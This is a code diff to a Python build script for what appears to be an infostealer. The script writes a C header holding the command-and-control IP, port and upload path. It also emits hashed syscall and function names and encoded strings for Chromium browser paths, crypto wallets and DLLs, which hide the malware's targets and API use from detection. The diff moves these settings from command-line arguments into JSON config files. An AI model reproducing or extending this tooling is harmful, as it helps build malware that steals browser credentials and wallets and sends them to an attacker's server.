@@ -1,11 +1,15 @@
 import socket
 import struct
-from sys import argv
-from RawData import *
+import json
+import re
 
-MacrosFile = "./include/macros.h"
-HashData = [syscalls, functions, wallets, EnvVariables]
-EncodeData = [ChromiumBrowsersPaths, dlls, OtherStuff]
+
+def ReadData(FileName):
+    file = open(FileName, "r")
+    JsonData = json.load(file)
+    file.close()
+
+    return JsonData
 
 def EncodeString(string):
     TempKey = 5
@@ -53,49 +57,42 @@ def HashString(string):
 def inet_addr(ip):
     return struct.unpack("I", socket.inet_aton(ip))[0]
 
-def GetHashedEncodedData():
-    FinalData = ""
-    for i in range(len(HashData)):
-        for j in range(len(HashData[i])):
-            HashedData = HashString(HashData[i][j])
-            if i == 0 and j == 0:
-                name = HashData[i][j].split(".")[0].upper()
-            elif i == 2:
-                name = WalletsNames[j].upper()
-            else:
-                name = HashData[i][j].upper()
-
-            FinalData += (f"#define {name} {HashedData}\n")
-
-    for i in range(len(EncodeData)):
-        for j in range(len(EncodeData[i])):
-            EncodedData = ", ".join(EncodeString(EncodeData[i][j]))
-            if i == 0:
-                if j >= 14:
-                    name = EncodeData[i][j].split("\\")[2].replace(" ", "_")
-                else:
-                    name = EncodeData[i][j].split("\\")[1].replace(" ", "_")
-
-                FinalData += (f"#define {name.upper()} {{{EncodedData}}}\n")
-            elif i== 1:
-                name = EncodeData[i][j].split(".")[0]
-                FinalData += (f"#define {name.upper()} (unsigned short[{len(EncodeData[i][j]) + 1}]){{{EncodedData}}}\n")
-            else:
-                name = MacroName[j]
-                FinalData += (f"#define {name} {{{EncodedData}}}\n")
-
-    return FinalData
-
 def main():
-    file = open(MacrosFile, "w")
-    data = "#ifndef MACROS_YS\n#define MACROS_YS\n\n\n"
-    data += f"#define C2_IP {inet_addr(argv[1])}\n"
-    data += f"#define C2_PORT {socket.htons(int(argv[2]))}\n\n\n"
-    data += GetHashedEncodedData()
-    data += "\n\n\n#endif"
+    FullData = "#ifndef MACROS_YS\n#define MACROS_YS\n\n\n"
+    ConfigData = ReadData("config.json")
+    RawData = ReadData("./build-tools/RawData.json")
+    OutFile = open("./include/macros.h", "w")
 
-    file.write(data)
-    file.close()
+#add the ip and port
+    FullData += f"#define C2_IP {inet_addr(ConfigData["IP"])}\n"
+    FullData += f"#define C2_PORT {socket.htons(ConfigData["PORT"])}\n\n\n"
+
+#update the path in the http request
+    if ConfigData["C2_UPLOAD_PATH"] == "":
+        UploadPath = "/up"
+    else:
+        UploadPath = ConfigData["C2_UPLOAD_PATH"]
+    RawData["HttpRequestHeader"]["HTTPREQUEST"] = re.sub(r'__UPLOADPATH__', UploadPath, RawData["HttpRequestHeader"]["HTTPREQUEST"])
+
+#hash sysaclls and functions names and other data and add them
+    for item in RawData["hash"]:
+        for key, value in RawData[item].items():
+            HashedData = HashString(value)
+            FullData += f"#define {key} {HashedData}\n"
+
+#encode strings and add them
+    for item in RawData["encode"]:
+        for key, value in RawData[item].items():
+            EncodedData = ", ".join(EncodeString(value))
+            if item == "DLLs":
+                FullData += f"#define {key} (unsigned short[{len(value) + 1}]){{{EncodedData}}}\n"
+            else:
+                FullData += f"#define {key} {{{EncodedData}}}\n"
+
+    FullData += "\n\n\n#endif"
+    OutFile.write(FullData)
+    OutFile.close()
+
 
 if __name__ == "__main__":
     main()
